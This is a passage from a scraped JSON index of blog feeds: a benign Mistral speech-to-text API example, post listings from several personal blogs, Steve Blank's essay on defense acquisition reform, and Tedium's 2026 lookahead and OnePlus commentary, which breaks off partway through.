-F file=@\"Pelican talk at the library.m4a\" \\\n  -F diarize=true \\\n  -F context_bias=\"Datasette\" \\\n  -F timestamp_granularities=\"segment\"</pre> <p>The Mistral API console now has a speech-to-text playground for exercising the new model and it is excellent. You can upload an audio file and promptly get a diarized transcript in a pleasant interface, with options to download the result in text, SRT or JSON format.</p> <p> <p>Via Hacker News</p> <p>Tags: ai, generative-ai, llms, hugging-face, mistral, speech-to-text</p>  ---  *\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49*"},{"location":"skyfall.dev/","title":"skyfall.dev","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"skyfall.dev/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"skyfall.dev/#1-the-uk-paid-41-million-for-a-bookmarks-site","title":"1. The UK paid \u00a34.1 million for a bookmarks site","text":"<p>\u94fe\u63a5: https://mahadk.com/posts/ai-skills-hub/</p> <p>\u65e5\u671f: Wed, 28 Jan 2026 00:00:00 GMT</p> <p>\u6458\u8981: Or, as they like to call it, the 'AI Skills Hub'. Which was built by PwC because of course it was</p>"},{"location":"skyfall.dev/#2-using-the-m1-macbook-air-in-2026","title":"2. Using the M1 MacBook Air in 2026","text":"<p>\u94fe\u63a5: https://mahadk.com/posts/m1-mba/</p> <p>\u65e5\u671f: Sat, 17 Jan 2026 00:00:00 GMT</p> <p>\u6458\u8981: It's surprisingly capable more than five years later \u2014 as long as you temper your expectations.</p>"},{"location":"skyfall.dev/#3-getting-rails-activestorage-blob-ids-from-file-urls","title":"3. Getting Rails' ActiveStorage blob IDs from file URLs","text":"<p>\u94fe\u63a5: https://mahadk.com/posts/activestorage-file-id/</p> <p>\u65e5\u671f: Fri, 12 Dec 2025 18:00:00 GMT</p> <p>\u6458\u8981: Learn how to extract ActiveStorage blob IDs from expiring ActiveStorage URLs.</p>"},{"location":"skyfall.dev/#4-why-ai-browsers-havent-taken-off","title":"4. Why AI browsers haven't taken off","text":"<p>\u94fe\u63a5: https://mahadk.com/posts/ai-browsers/</p> <p>\u65e5\u671f: Wed, 22 Oct 2025 18:00:00 GMT</p> <p>\u6458\u8981: In theory, AI browsers are huge time-savers. So why aren't they more popular?</p>"},{"location":"skyfall.dev/#5-slack-is-extorting-us-with-a-195kyr-bill-increase","title":"5. Slack is extorting us with a $195k/yr bill increase","text":"<p>\u94fe\u63a5: https://mahadk.com/posts/slack/</p> <p>\u65e5\u671f: Thu, 18 Sep 2025 18:00:00 GMT</p> <p>\u6458\u8981: An open letter, or something</p>"},{"location":"skyfall.dev/01_The_UK_paid__4.1_million_for_a_bookmarks_site/","title":"The UK paid \u00a34.1 million for a bookmarks site","text":"<p>\u539f\u6587\u94fe\u63a5: https://mahadk.com/posts/ai-skills-hub/ \u53d1\u5e03\u65e5\u671f: Wed, 28 Jan 2026 00:00:00 GMT</p> <p>Or, as they like to call it, the 'AI Skills Hub'. Which was built by PwC because of course it was</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"skyfall.dev/02_Using_the_M1_MacBook_Air_in_2026/","title":"Using the M1 MacBook Air in 2026","text":"<p>\u539f\u6587\u94fe\u63a5: https://mahadk.com/posts/m1-mba/ \u53d1\u5e03\u65e5\u671f: Sat, 17 Jan 2026 00:00:00 GMT</p> <p>It's surprisingly capable more than five years later \u2014 as long as you temper your expectations.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"skyfall.dev/03_Getting_Rails__ActiveStorage_blob_IDs_from_file_UR/","title":"Getting Rails' ActiveStorage blob IDs from file URLs","text":"<p>\u539f\u6587\u94fe\u63a5: https://mahadk.com/posts/activestorage-file-id/ \u53d1\u5e03\u65e5\u671f: Fri, 12 Dec 2025 18:00:00 GMT</p> <p>Learn how to extract ActiveStorage blob IDs from expiring ActiveStorage URLs.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"skyfall.dev/04_Why_AI_browsers_haven_t_taken_off/","title":"Why AI browsers haven't taken off","text":"<p>\u539f\u6587\u94fe\u63a5: https://mahadk.com/posts/ai-browsers/ \u53d1\u5e03\u65e5\u671f: Wed, 22 Oct 2025 18:00:00 GMT</p> <p>In theory, AI browsers are huge time-savers. So why aren't they more popular?</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"skyfall.dev/05_Slack_is_extorting_us_with_a__195k_yr_bill_increas/","title":"Slack is extorting us with a $195k/yr bill increase","text":"<p>\u539f\u6587\u94fe\u63a5: https://mahadk.com/posts/slack/ \u53d1\u5e03\u65e5\u671f: Thu, 18 Sep 2025 18:00:00 GMT</p> <p>An open letter, or something</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"steveblank.com/","title":"steveblank.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Making the Wrong Things Go Faster at The Department of War 20260203</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"steveblank.com/Making%20the%20Wrong%20Things%20Go%20Faster%20at%20The%20Department%20of%20War_20260203/","title":"Making the Wrong Things Go Faster at The Department of War","text":"<p>\u6765\u6e90: steveblank.com \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 14:00:08 +0000 \u94fe\u63a5: https://steveblank.com/2026/02/03/making-the-wrong-things-go-faster-at-the-department-of-war/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://steveblank.com/feed/', 'value': '<p></p>\\n<p>This article previously appeared in Defense Scoop</p>\\n<p>The Department of War (DoW) senior Acquisition leadership (the people who decide what and how the DoW buys equipment and services) now is headed by people from private capital (venture capital and private equity.)\\xa0</p>\\n<ul>\\n<li>Deputy Secretary of War Steven Feinberg ran Cerebus Capital</li>\\n<li>Secretary of the Army Daniel Driscoll was a former VC and investment banker</li>\\n<li>Secretary of the Navy John Phelan ran MSD capital.</li>\\n<li>Deputy Secretary of the Army Michael Obadal was a senior director at Anduril</li>\\n</ul>\\n<p>The Department of War is in the midst of once-in-a-lifetime changes of how it acquires weapons, software and systems. The new Warfighting Acquisition System rewards speed and timely delivery of things that matter to the Warfighter. But this new system is at risk of making the wrong things go faster.</p>\\n<p>Here\u2019s why and what they should do.</p>\\n\\n<p>What Now?\\nAcquisition in the DoW is being reorganized how a Private Equity would reorganize a large company. They bring in (or empower) a new operating team, swap executives, change incentives, kill things not core to their mission, cut costs, invest for growth, and restructure to find additional financing.</p>\\n<p>That\u2019s being played out at the Department of War right now. The announcement of the\\xa0 consolidation of individual weapons systems (each of which had their own silos of Requirements, Test/Evaluation, Budgeting, and Acquisition) into a unified Portfolio Acquisition Executive, is a classic Private Equity strategy. Instead of 100s of programs operating with separate budgets, across different Program Executive Offices, the intent of the Portfolio Acquisition Executives is to consolidate overlapping programs, eliminate the redundant ones, pick winners, kill losers, get rid of processes that kill speed, and focus on rapid deployment.</p>\\n<p>What\u2019s Missing?\\nOrganizing by Portfolio Acquisition Executives is a great start, but simply consolidating the parts of the defense Acquisition system that were broken under one umbrella organization won\u2019t make it better. Making bad ideas go faster should not be the goal. However, we\u2019re at risk of doing just that. (Pete Newell at BMNT has been reminding me of this for years.)</p>\\n<p>For example, many of these new Portfolio executives are managing their programs by holding monthly reviews of proposed investments and current portfolio performance (just like private investors.) Here they\u2019ll decide which programs get funded, which get more funding, and which should stop. (Actually having a regular process to kill programs early is sorely needed.) These are great ideas. However, if the meetings start by reviewing progress of prototypes to show that the technology works or that warfighters want it, and funds progress on those metrics, it misses the changes needed in an effective acquisition system.</p>\\n<p>The result will be building a faster version of a weapons requirements process that starts with a top-down list of features, or worse, shiny tech products (e.g. \u201cI need drones.\u201d) This \u201crequirements first\u201d process is what will drive the \u201cbad ideas faster\u201d problem.</p>\\n<p>A more productive approach \u2013 one that delivers truly decisive capabilities \u2013 would be to build a different process upfront \u2013 a rigorous problem identification and validation phase on the front-end of every acquisition program.</p>\\n<p>This process would start with a wide funnel of problems, ideas, technology, each with a 10-line problem summary that describes the\\xa0 specific challenge to address; why it can\u2019t be solved currently; what it will take to solve it; and how a solution will be funded and deployed in the field.</p>\\n<p>The goal would be to 1) consolidate problems that may be different descriptions of the same core problem, and/or 2) discover if the problems are a symptom of something more complex.</p>\\n<p>Then each problem would go through an iterative process of problem and technical discovery. This will help define what a minimum deployable product and its minimum constraints (security, policy, reliability) should be, such as how long the solution would take to deploy, the source of funding for scale and who needs to buy-in.</p>\\n<p>This exercise will keep the focus where it needs to be \u2014 not on reforming a system but on delivering things to warfighters with speed and urgency so we can actually deter or win a war.</p>\\n<p>Want to Keep Up With the Changes in the DoW?</p>\\n<p>Get the free 2026 DoW Directory.</p>\\n<p>Both a startup \u201cgo-to-market\u201d guide and the first ever Directory of the Department of War. It\u2019s an invaluable desk reference to figure out who, what and where.</p>\\n<p>Download the free DoW Directory here.</p>\\n<p>Keep current with updates here</p>\\n<p>Order a desk copy here\\xa0</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"susam.net/","title":"susam.net","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"susam.net/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"susam.net/#1-quickqwerty-121","title":"1. QuickQWERTY 1.2.1","text":"<p>\u94fe\u63a5: https://susam.net/code/news/quickqwerty/1.2.1.html</p> <p>\u65e5\u671f: Tue, 27 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: QuickQWERTY 1.2.1 is now available. QuickQWERTY is a web-based touch typing tutor for QWERTY keyboards that runs directly in the web browser. This release contains a minor bug fix in Unit 4.3. Unit 4....</p>"},{"location":"susam.net/#2-attention-media-social-media","title":"2. Attention Media \u2260 Social Media","text":"<p>\u94fe\u63a5: https://susam.net/attention-media-is-not-social-media.html</p> <p>\u65e5\u671f: Tue, 20 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: When web-based social media started flourishing nearly two decades ago, they were genuinely social media. You would sign up for a popular service, follow people you knew or liked and read updates from...</p>"},{"location":"susam.net/#3-nested-code-fences-in-markdown","title":"3. Nested Code Fences in Markdown","text":"<p>\u94fe\u63a5: https://susam.net/nested-code-fences.html</p> <p>\u65e5\u671f: Mon, 19 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: Today, we will meet a spiky-haired nerd named Corey Dumm, who normally lives within Markdown code fences. We will get to know him a bit, smile with him when his fences hold and weep quietly when misfo...</p>"},{"location":"susam.net/#4-minimal-github-workflow","title":"4. Minimal GitHub Workflow","text":"<p>\u94fe\u63a5: https://susam.net/minimal-github-workflow.html</p> <p>\u65e5\u671f: Thu, 15 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: This is a note where I capture the various errors we receive when we create GitHub workflows that are smaller than the smallest possible workflow. I do not know why anyone would ever need this informa...</p>"},{"location":"susam.net/#5-three-inverse-laws-of-robotics","title":"5. Three Inverse Laws of Robotics","text":"<p>\u94fe\u63a5: https://susam.net/inverse-laws-of-robotics.html</p> <p>\u65e5\u671f: Mon, 12 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: Introduction Since the launch of ChatGPT in November 2022, generative artificial intelligence (AI) chatbot services have become increasingly sophisticated and popular. These systems are now embedded i...</p>"},{"location":"susam.net/01_QuickQWERTY_1.2.1/","title":"QuickQWERTY 1.2.1","text":"<p>\u539f\u6587\u94fe\u63a5: https://susam.net/code/news/quickqwerty/1.2.1.html \u53d1\u5e03\u65e5\u671f: Tue, 27 Jan 2026 00:00:00 +0000</p> <p>QuickQWERTY 1.2.1 is now available. QuickQWERTY is a web-based touch typing tutor for QWERTY keyboards that runs directly in the web browser. This release contains a minor bug fix in Unit 4.3. Unit 4....</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"susam.net/02_Attention_Media___Social_Media/","title":"Attention Media \u2260 Social Media","text":"<p>\u539f\u6587\u94fe\u63a5: https://susam.net/attention-media-is-not-social-media.html \u53d1\u5e03\u65e5\u671f: Tue, 20 Jan 2026 00:00:00 +0000</p> <p>When web-based social media started flourishing nearly two decades ago, they were genuinely social media. You would sign up for a popular service, follow people you knew or liked and read updates from...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"susam.net/03_Nested_Code_Fences_in_Markdown/","title":"Nested Code Fences in Markdown","text":"<p>\u539f\u6587\u94fe\u63a5: https://susam.net/nested-code-fences.html \u53d1\u5e03\u65e5\u671f: Mon, 19 Jan 2026 00:00:00 +0000</p> <p>Today, we will meet a spiky-haired nerd named Corey Dumm, who normally lives within Markdown code fences. We will get to know him a bit, smile with him when his fences hold and weep quietly when misfo...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"susam.net/04_Minimal_GitHub_Workflow/","title":"Minimal GitHub Workflow","text":"<p>\u539f\u6587\u94fe\u63a5: https://susam.net/minimal-github-workflow.html \u53d1\u5e03\u65e5\u671f: Thu, 15 Jan 2026 00:00:00 +0000</p> <p>This is a note where I capture the various errors we receive when we create GitHub workflows that are smaller than the smallest possible workflow. I do not know why anyone would ever need this informa...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"susam.net/05_Three_Inverse_Laws_of_Robotics/","title":"Three Inverse Laws of Robotics","text":"<p>\u539f\u6587\u94fe\u63a5: https://susam.net/inverse-laws-of-robotics.html \u53d1\u5e03\u65e5\u671f: Mon, 12 Jan 2026 00:00:00 +0000</p> <p>Introduction Since the launch of ChatGPT in November 2022, generative artificial intelligence (AI) chatbot services have become increasingly sophisticated and popular. These systems are now embedded i...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"tedium.co/","title":"tedium.co","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>A Number Of Surprising Importance</li> <li>Minus World</li> <li>Slide Away</li> <li>Splitting Machines</li> <li>They Were Robbed</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"tedium.co/A%20Number%20Of%20Surprising%20Importance/","title":"A Number Of Surprising Importance","text":"<p>\u6765\u6e90: tedium.co \u53d1\u5e03\u65f6\u95f4: Unknown \u94fe\u63a5: https://tedium.co/2026/01/02/tedium-trends-2026/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' The number 26, which gets back-burnered compared to numbers with neater divisibility, is an essential digit. And you\u2019re gonna be hearing all about it in 2026. Hey all, it\u2019s our annual lookahead, which we\u2019ve done every year since the start of this crazy thing. (To give you an idea, here\u2019s last year\u2019s .) This covers a lot of ground in a very broken-up format. Hope you dig! Today in Tedium: In 2017, Google corporate parent Alphabet founded a holding company called XXVI Holdings , named for the number of letters in the alphabet. (26, for those playing at home.) The goal of the company was to better separate the different companies from one another\u2014meaning that, in a corporate sense, Google is distinct, from, say, Waymo. The ultimate end-user-facing result of this subtle change is that, if you receive a 1099 tax form for revenue received from a Google-owned platform, you\u2019re likely getting it from this seemingly obscure company. But, here\u2019s the spoiler alert: It\u2019s actually from the most common company in the world. It sort of points out the prevalence of 26 as a number in our lives. While Google is the clean, front-facing version of this giant company that is all over you phone (even if you\u2019re an iPhone user), it\u2019s the number 26 doing the dirty work. The number 26 is behind the scenes, but in 2026, it\u2019s gonna be everywhere. And, as today\u2019s Tedium highlights, everyone is going to be holding XXVI this year. \u2014 Ernie @ Tedium \u201cFor obvious reasons, t\u2092 shall be called \u2018doomsday,\u2019 since it is on that date, t = t\u2092, that N goes to infinity and that the clever population annihilates itself.\u201d \u2014 A passage from \u201cDoomsday: Friday, 13 November, A.D. 2026,\u201d an article published by Heinz von Foerster in 1960. Unlike most predictions about the end of the world, von Foerster, considered a key early figure in cybernetics, made his prediction in Science , the official publication of the American Association for the Advancement of Science. (He and his colleagues also developed an equation for it, which one guesses his doomsday-predicting peers did not.) One silver lining, per von Foerster? We have control over the outcome. \u201cSince today man\u2019s environment becomes less and less influenced by \u2018natural forces\u2019 and is more and more defined by social forces determined by man, he himself can take control over his fate in this matter, as well as he has done in almost all areas of life where the activity of the individual has influenced his own kind,\u201d he writes. Optimistic stuff. Try as we might, this joke will never get old. ( \\ngena96/ DepositPhotos.com ) Oh good, another year of AI ruining wall calendars for everyone Last year, you might remember that there was a real AI infusion in the year\u2019s wall calendars, which made me do something unexpected: Ban Etsy calendars from my annual review of wall calendars. In the 12 months since, the AI has gotten more realistic, and it\u2019s infused even deeper in the calendars, some of which now appear on Amazon. And some of them are straight ripoffs\u2014check out this semi-NSFW \u201c Extremely Accurate Birds \u201d calendar, which has cake for weeks and was created by an artist, and compare it to this \u201c Various Actions \u201d calendar, by a no-name manufacturer. If you\u2019re looking for birds with big human-like butts, you will need to be more discerning to ensure that you\u2019re getting something drawn by a human and not Midjourney. A few highlights for 2026: Space Cats: There is a strong overlap between modern cat wall calendars and late-\u201990s No Limit album covers, and this wall calendar definitely found the delta. (Also I hate to inform you of this, but it\u2019s possible to get the wrong Space Cats calendar, because there\u2019s another one . And a third . And a fourth . Collect \u2019em all, I guess!) A Punbelievable Year: \u201cThe things you say/your lame dad jokes just give you away/the things you say/they\u2019re punbelievable .\u201d 2026 9 To 5 Bigfoot Calendar: I\u2019m in the wrong line of business. I should be throwing the most insane visual ideas to Sora and Nano Banana and hoping that those lead me to create the next calendar of Bigfoot working a regular job like the rest of us. Word of warning: One of the images features Bigfoot wearing a leotard and leading an aerobics class, which should be a deterrent, but if you were thinking about buying this, probably isn\u2019t. Mud, 12-Month Calendar: Finally, a kind of wall calendar too hard for Gemini to realistically recreate in five minutes. However, you could probably recreate this on a rainy day with an all-wheel-drive vehicle if you so desired. If calendars are a way of selling a fantasy, a break from normal life, this mud-themed wall calendar ain\u2019t doing it. Aspire 2026 wall calendar: It seems like such a great way to make money. Hop on BrainyQuote, grab the best quotes , put some flowers behind it, and boom! Revenue. But as I noted in a 2022 piece on quotes , quotation cites like BrainyQuote go out of their way to obfuscate the sources of their quotes. Which means that these quotes could be real, or they could be made up. Wonder if the Aspire folks thought to add any Kurt Cobain quotes to this one. Overall, the slop is seeping into the wall calendar this year, just like your Uncle Walter\u2019s Facebook feed. I really need to get on building that wall calendar I\u2019m too much of a coward to make. Sponsored By \u2026 You? If you find weird or unusual topics like this super-fascinating, the best way to tell us is to give us a nod on Ko-Fi . It helps ensure that we can keep this machine moving, support outside writers, and bring on the tools to support our writing. (Also it\u2019s heartening when someone chips in.) We accept advertising, too! Check out this page to learn more . 26 The number of Oscars personally won by Walt Disney, 22 of which were in competition and four were honorary. (And one of which was an unusual bespoke Oscar with one giant statue and seven small ones, which was of course won for Snow White &amp; The Seven Dwarves .) That makes him the individual with the most Oscars in Academy Award history , a record likely to be unbroken. (Show-off.) I know, \u201cnow with more folic acid\u201d isn\u2019t exactly a great selling point for tortillas, but there\u2019s a real logic to it. (miflippo/ DepositPhotos.com ) Five reasons 2026 will be better than 2025 Your tortillas (at least in California) are getting healthier. A new law in California requires that corn masa flour , and products based on corn masa, include added folic acid\u2014something already required by the FDA in other types of flour. The result is that corn tortillas, a staple food of Mexican cuisine, are going to be healthier for infants in particular. A bunch more stuff is hitting the public domain. Books from Langston Hughes and William Faulkner are now public domain in the United States. Meanwhile, outside the U.S., works from a number of figures who died in 1955\u2014most notably Albert Einstein and Charlie Parker\u2014are also getting the public domain treatment, per the Public Domain Review . Peace out, tiny shampoo bottles. One key part of business travel is the tiny toiletries that come in every single hotel room ever. But that\u2019s starting to change, especially in Illinois, considered one of the hubs of event travel. A law banning tiny shampoo bottles in the state\u2019s hotels took effect this week. (They join Washington, New York, and California.) You can\u2019t take the bottles home, but the dispensers are more environmentally friendly anyway. Utah\u2019s ID checks are about to get even tougher. I\u2019ve only been to Utah once, and when I went, I remember getting a lot of grief for leaving my ID in my hotel room and then attempting to order a beer somewhere. The state, known for having a lot of teetotalers, is further tightening its grip, requiring 100% ID checks and adding a big red \u201cno alcohol sale\u201d message on the drivers\u2019 licenses of people with extreme DUI convictions. (Oh yeah, if you want to be banned from buying alcohol, you can just ask for an ID with that restriction. Nothing like a little state-sponsored self-control.) We\u2019re finally getting a little closer to the moon. After taking a multi-decade break from moon travel, NASA is sending astronauts within shouting distance of it for the first crewed mission in more than 50 years. The Artemis II mission , expected to launch as soon as next month, will have astronauts getting close to the moon, but not landing on it. But if all goes well, future landings might be in the cards. The fingerprints of the past stick with us far beyond the actual people. It\u2019s worth remembering that. ( Alex Dukhanov/Unsplash ) The state of our Tedium in 2026 is defined by our loss We lose people every year, but something about 2025 made those losses feel more visual and visceral than usual. Two of the most high-profile news stories of 2025 involved murders of public figures\u2014one in an assassination, two others by a family member. Political violence crept up, and it was painful whether or not their politics were your politics. A governor nearly had his mansion burned down while he was inside of it. And the flare-ups of the current political moment certainly feel like they\u2019re not going away just because we changed the page on the calendar. But I think there\u2019s something a bit less dramatic and a bit more matter-of-fact going on. We are about 40 years from the peak of the monoculture, before television had yet to split into hundreds of cable channels, before computers and smartphones let us find our own tribes and self-select around our very specific hobbies. And because of that distance, the truth is that we\u2019re going to lose more important people in quick succession, whether we like it or not. I was reminded of this when I was looking back at my coverage earlier this year for our year-end pieces. I had almost forgotten that we lost Biff Wiff, the oddball character actor that became a late-in-life favorite of I Think You Should Leave With Tim Robinson , at the beginning of the year. (To be fair, there was an absolute avalanche of news around that time.) But I was also reminded of this in a more visceral way. I was in a store, shopping for hiking boots (hoping to take part in a first-day hike), when I got an email informing me that Stewart Cheifet had just died . This hit me harder than most. For those not familiar, Cheifet is one of the most important journalists in the history of technology, because of two important things he did: First, he created and hosted Computer Chronicles , a nationally syndicated television show highlighting important technology trends. (It was on PBS, the natural home for such a show.) And second, once the show ended, he went out of his way to ensure that the show got properly archived, working closely with the Internet Archive to solve that problem. He essentially gave many formative technology trends some of their only television exposure. (As I noted in a February 2025 piece about technology , Cheifet gave the topic of my story, ACCESS.bus, some of the only video-based coverage around.) But is also reflected the sheer challenge of the monoculture at this time. When he started around 1983, we were many years away from having a network like TechTV or G4. (Linus Tech Tips? Hah, Linus Sebastian wasn\u2019t even born yet.) For most viewers, if you cared about computers and wanted to watch a show about it, this was it. And by taking the time to archive it, he essentially created the window through which so much of our understanding of tech history flows. Like it or not, we live in a visual medium. As great as it is to have a John C. Dvorak column or a 6,000-word feature about a tech concept, having Cheifet talk about that same concept on a screen is a lot more impactful to digital culture. When Cheifet\u2019s obit was posted on Hacker News on Wednesday, some people described falling asleep to marathons of Cheifet\u2019s old videos (many of which were done with Gary Kildall , himself a stone-cold tech legend). He represented the bridge between the monoculture of tech and the microculture of tech we have now. I will be the first to admit that Cheifet won\u2019t hit the radar for the average person, but he is more important than he seems. The work he was doing was extremely uncommon then, but is everywhere now. Every major media outlet that presents tech in video form owes him a mountain of praise. We are going to see more losses like his in the years ahead, and they\u2019re going to come from a moment where these figures were dominant in culture in a way that your favorite creator could never think of. Sure, it\u2019s just how time goes, but I think they\u2019re going to hit harder because the people we lose are likely going to be those you watched on TV every week for 20 years, not some faded figure from another time. The loss of Rob Reiner underlines this. He died a mere four months after creating a long-awaited sequel to his first film, This Is Spinal Tap . People pointed out that, while his recent films have struggled to make quite the same impact, his early work has numerous quotable moments that have become cultural touchstones. Someone with a similar skill set, starting today, would struggle to reach the same heights, and not even for artistic reasons. When we live in a world of 1,000 true fans, it\u2019s hard for one person to so effectively dominate the culture. This year represents a decade since 2016, when we saw many extremely influential musicians die in a single year. We lost David Bowie, and Prince, and George Michael, and Leonard Cohen. (That\u2019s only the tip of the iceberg , by the way.) We may be due for a similar tipping-point year like that. Our heroes of the TV monoculture era aren\u2019t going to be with us forever. Recently, I wrote a piece about losing a friend , and as I get older, I\u2019m sure more of those pieces will come, and they will hurt every time. Loss is not a new thing in my life, but there\u2019s cultural loss and personal loss. I feel like we\u2019re a point where the cultural loss will feel personal. And yes, it will be hard. But remember the impact it had on us. Fe The atomic symbol for iron , the 26th element of the Periodic Table. It\u2019s one of many elements, but one of the most important ones. After all, iron gave us steel, and is key to the human body\u2019s function via its bloodstream. (Also, it\u2019s found in the sun, which is not nothing.) It highlights how the number 26, even as it takes a backseat to other numbers, is everywhere. Going back to our intro, which talked about 1099s, here\u2019s a fun quirk involving the number 26 and the year 2026. See, many companies tend to pay people on a biweekly basis\u2014which, since there are 52 weeks in a year, means that you\u2019re generally getting paid 26 times per year. But here\u2019s the fun, ironic thing: Because of a quirk of the payroll system, people will actually get 27 payments in 2026, not 26. It\u2019s an issue that happens once every 11 years or so, which means the last time it happened was in 2015. Sounds kind of silly, but it\u2019s surprisingly a fraught issue. Every 11 years, biweekly paydays create a problem for large companies. (NewAfrica/ DepositPhotos.com ) See, it puts employers in a catch-22: They could pay slightly less money over those 27 payments and hope it doesn\u2019t run afoul of labor law. (Or that their employees don\u2019t notice.) Or they could simply make the extra payment, temporarily increasing their salary by a couple thousand dollars just to keep things consistent. As Mike Fussell of the Employment Law Worldview blog writes, this is going to cause a problem for some companies that might find themselves running into legal issues or added costs, depending on how they handle this shift: Additionally, employers should ensure any decreases in exempt salaried employees\u2019 biweekly wage payments do not reduce the employees\u2019 weekly salary below the salary threshold necessary to claim an exemption under the Fair Labor Standards Act\u2014currently $684/week\u2014or similar state wage laws (some of which have even higher weekly salary thresholds). A failure to meet such weekly salary thresholds could result in an employee losing their exempt status, making them eligible for overtime pay. If you ask me, paying the checks on time and correctly is a better move than changing the pay structure. (Or, you could do what some companies do instead\u2014pay each month on the 15th and last day of the month, losing the every-other-Friday cadence but ensuring you\u2019re not overpaying once every 11 years.) The Past Of The Future If you\u2019d like to experience life during a previous year, check out our New Years\u2019 pieces from prior years: 2025 , 2024 2023 , 2022 , 2021 , 2020 , 2019 , 2018 , 2017 , 2016 , and 2015 . But I think this odd numerical quirk of the 2026 calendar year points to the tension that the year inherently has. It\u2019s an odd middle year, one that doesn\u2019t draw a ton of attention to itself most of the time. (Barring the fact that, well, it\u2019s the country\u2019s 250th anniversary in 2026, as the country\u2019s symbolic vape shop , the Washington Monument, pointed out this week.) For the sake of everyone, I hope it\u2019s the year when you get an unexpected extra check. -- Find this one an interesting read? Share it with a pal ! And thanks again for sticking with us into year 11 of this crazy platform. Need a machine that\u2019s gonna stick by you every year? Our friends at la machine will definitely do the trick. It works the same no matter what the date on the calendar says\u2014and we love it for that. Thanks to them for sponsoring! '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:20</p>"},{"location":"tedium.co/Minus%20World/","title":"Minus World","text":"<p>\u6765\u6e90: tedium.co \u53d1\u5e03\u65f6\u95f4: Unknown \u94fe\u63a5: https://tedium.co/2026/01/22/oneplus-decline-shutdown-rumors-commentary/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Rumors of OnePlus\u2019 possible death are heating up, which would be a real shame, given how much the smartphone market has already contracted. It\u2019s not true, but their grip is slipping. With all the panicked chatter about the OnePlus brand over the last couple of days, I have a useful anecdote to add. And it involved a recent trip to the very T-Mobile store I first got acquainted with the OnePlus brand, which has largely treated me pretty well. But on that day, I briefly pondered if I would be happier on a carrier plan after buying my last OnePlus phone outright. I was dismayed by my options, none of which had anything close to my OnePlus 11\u2019s killer feature: 80-watt fast charging. It shouldn\u2019t have been this way. After all, I found out about these phones by going into this specific T-Mobile store about eight years ago, when the iPhones started to feel overly expensive and less flexible. Looking at my options, I wandered to the other side of the store, and there it was: The OnePlus 6t, a genuinely good phone for about half the price, minus the iPhone\u2019s ugly forehead. That was my introduction to Android, and it was a lasting one; I am currently on my fifth OnePlus phone, after a brief diversion to Samsung-land that honestly couldn\\'t have ended soon enough. But when I walked in the store last month, I realized the sales staff didn\u2019t have any idea what OnePlus was when I said I wished they still sold them. Instead, the salesperson acted like I was crazy talking about this brand. I wasn\u2019t. They used to sell this brand, with its fast charging and unique features catching the eye. (For my money, the pop-up selfie camera, a highlight of the OnePlus 7, was the best feature a mainstream phone ever had.) The manager knew what this brand was, but he told his employee that 